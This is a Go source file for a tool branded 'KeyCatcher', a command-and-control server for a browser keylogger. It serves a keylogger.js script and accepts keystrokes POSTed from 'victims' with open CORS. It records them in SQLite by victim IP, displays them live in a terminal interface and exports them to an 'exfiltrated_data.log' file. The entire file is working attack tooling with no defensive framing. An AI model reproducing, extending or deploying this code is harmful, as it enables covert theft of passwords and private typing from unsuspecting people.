package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gdamore/tcell/v2"
	_ "github.com/mattn/go-sqlite3"
	"github.com/rivo/tview"
)

// --- Configuration ---
const (
	listenPort = "80"
	dbFile     = "keystrokes.db"
	exportFile = "exfiltrated_data.log"
)

type Keypress struct {
	Key string `json:"key"`
}

var (
	app           *tview.Application
	victimList    *tview.List
	keystrokeView *tview.TextView
	infoBox       *tview.TextView
	db            *sql.DB
)

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func main() {
	var err error
	db, err = initDB()
	if err != nil {
		log.Fatalf("Failed to initialize database: %v", err)
	}
	defer db.Close()

	app = tview.NewApplication()
	localIP := getOutboundIP()

	bannerText := `[green]
  _  __           ____      _       _
 | |/ /___ _   _ / ___|__ _| |_ ___| |__   ___ _ __
 | ' // _ \ | | | |   / _' | __/ __| '_ \ / _ \ '__|
 | . \  __/ |_| | |__| (_| | || (__| | | |  __/ |
 |_|\_\___|\__, |\____\__,_|\__\___|_| |_|\___|_|
           |___/

              [::b]by EragonKashyap11
`
	bannerView := tview.NewTextView().
		SetDynamicColors(true).
		SetText(bannerText)

	victimList = tview.NewList().ShowSecondaryText(false)
	victimList.SetBorder(true).SetTitle(" Victims (IPs) ")

	keystrokeView = tview.NewTextView().
		SetDynamicColors(true).
		SetScrollable(true)
	keystrokeView.SetBorder(true).SetTitle(" Keystrokes ")

	infoBox = tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	updateInfoBox(fmt.Sprintf("[yellow]Listening on: [white]%s:%s[yellow] | [Ctrl-E] Export | [Ctrl-C] Quit", localIP, listenPort))

	bannerFlex := tview.NewFlex().
		AddItem(nil, 0, 1, false).
		AddItem(bannerView, 70, 1, false).
		AddItem(nil, 0, 1, false)

	contentFlex := tview.NewFlex().
		AddItem(victimList, 0, 1, true).
		AddItem(keystrokeView, 0, 3, false)

	mainFlex := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(bannerFlex, 9, 1, false).
		AddItem(contentFlex, 0, 1, true).
		AddItem(infoBox, 1, 1, false)

	victimList.SetChangedFunc(func(index int, mainText, secondaryText string, shortcut rune) {
		updateKeystrokeView(mainText)
	})

	app.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyCtrlE {
			exportLogs()
			originalText := infoBox.GetText(false)
			updateInfoBox("[green]Success! Logs exported to " + exportFile)
			go func() {
				time.Sleep(2 * time.Second)
				app.QueueUpdateDraw(func() {
					updateInfoBox(originalText)
				})
			}()
			return nil
		}
		return event
	})

	go startServer()
	updateVictimList()

	if err := app.SetRoot(mainFlex, true).Run(); err != nil {
		panic(err)
	}
}

func updateInfoBox(text string) {
	infoBox.Clear().SetText(text)
}

func initDB() (*sql.DB, error) {
	os.Remove(dbFile)
	database, err := sql.Open("sqlite3", dbFile)
	if err != nil {
		return nil, err
	}
	statement, _ := database.Prepare(`CREATE TABLE IF NOT EXISTS keystrokes (id INTEGER PRIMARY KEY, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, victim_ip TEXT, key TEXT);`)
	statement.Exec()
	return database, nil
}

func startServer() {
	http.HandleFunc("/log", logKeyHandler)
	http.HandleFunc("/keylogger.js", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "keylogger.js")
	})
	log.Printf("Starting HTTP server on port %s", listenPort)
	if err := http.ListenAndServe(":"+listenPort, nil); err != nil {
		log.Fatalf("Server failed to start on port %s: %v. (Hint: Use 'sudo' for ports < 1024)", listenPort, err)
	}
}

func logKeyHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if r.Method != "POST" {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}
	var p Keypress
	if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
		return
	}
	victimIP := r.RemoteAddr
	if strings.Contains(victimIP, ":") {
		victimIP = strings.Split(victimIP, ":")[0]
	}
	stmt, _ := db.Prepare("INSERT INTO keystrokes (victim_ip, key) VALUES (?, ?)")
	stmt.Exec(victimIP, p.Key)
	app.QueueUpdateDraw(func() {
		updateVictimList()
		if victimList.GetItemCount() > 0 {
			if currentVictim, _ := victimList.GetItemText(victimList.GetCurrentItem()); currentVictim == victimIP {
				updateKeystrokeView(victimIP)
			}
		}
	})
	w.WriteHeader(http.StatusOK)
}

func updateVictimList() {
	var currentVictim string
	if victimList.GetItemCount() > 0 {
		currentVictim, _ = victimList.GetItemText(victimList.GetCurrentItem())
	}
	rows, err := db.Query("SELECT DISTINCT victim_ip FROM keystrokes ORDER BY timestamp DESC")
	if err != nil {
		return
	}
	defer rows.Close()

	victimList.Clear()
	var newVictimIndex int = 0
	var i int = 0
	for rows.Next() {
		var victimIP string
		rows.Scan(&victimIP)
		victimList.AddItem(victimIP, "", 0, nil)
		if victimIP == currentVictim {
			newVictimIndex = i
		}
		i++
	}
	victimList.SetCurrentItem(newVictimIndex)
}

// ==========================================================
// THIS FUNCTION IS UPDATED
// ==========================================================
func updateKeystrokeView(victimIP string) {
	if victimIP == "" {
		keystrokeView.Clear()
		return
	}
	rows, err := db.Query("SELECT key FROM keystrokes WHERE victim_ip = ? ORDER BY id ASC", victimIP)
	if err != nil {
		return
	}
	defer rows.Close()

	var builder strings.Builder
	for rows.Next() {
		var key string
		rows.Scan(&key)

		switch key {
		case "[SPACE]":
			builder.WriteString(" ")
		case "[ENTER]\n":
			builder.WriteString("\n")
		case "[BACKSPACE]":
			if builder.Len() > 0 {
				s := builder.String()
				s = string([]rune(s)[:len([]rune(s))-1])
				builder.Reset()
				builder.WriteString(s)
			}
		case "[SHIFT]", "[CAPS]":
			// Explicitly handle these tags for better formatting
			// Here we use a yellow color tag for visibility
			builder.WriteString(fmt.Sprintf("[yellow]%s[-]", key))
		default:
			// For all other keys
			builder.WriteString(key)
		}
	}

	keystrokeView.Clear().SetText(tview.TranslateANSI(builder.String()))
	keystrokeView.ScrollToEnd()
}

// ==========================================================
// THIS FUNCTION IS UPDATED
// ==========================================================
func exportLogs() {
	file, err := os.Create(exportFile)
	if err != nil {
		log.Printf("Failed to create export file: %v", err)
		return
	}
	defer file.Close()
	victimRows, err := db.Query("SELECT DISTINCT victim_ip FROM keystrokes")
	if err != nil {
		return
	}
	defer victimRows.Close()

	for victimRows.Next() {
		var victimIP string
		victimRows.Scan(&victimIP)
		file.WriteString(fmt.Sprintf("--- Keystrokes from Victim: %s ---\n", victimIP))
		keyRows, _ := db.Query("SELECT key FROM keystrokes WHERE victim_ip = ? ORDER BY id ASC", victimIP)
		
		var builder strings.Builder
		for keyRows.Next() {
			var key string
			keyRows.Scan(&key)
			
			switch key {
			case "[SPACE]":
				builder.WriteString(" ")
			case "[ENTER]\n":
				builder.WriteString("\n")
			case "[BACKSPACE]":
				if builder.Len() > 0 {
					s := builder.String()
					s = string([]rune(s)[:len([]rune(s))-1])
					builder.Reset()
					builder.WriteString(s)
				}
			case "[SHIFT]", "[CAPS]":
				// We also add the tags to the log file for clarity
				builder.WriteString(key)
			default:
				builder.WriteString(key)
			}
		}
		keyRows.Close()
		file.WriteString(builder.String())
		file.WriteString("\n\n")
	}
}
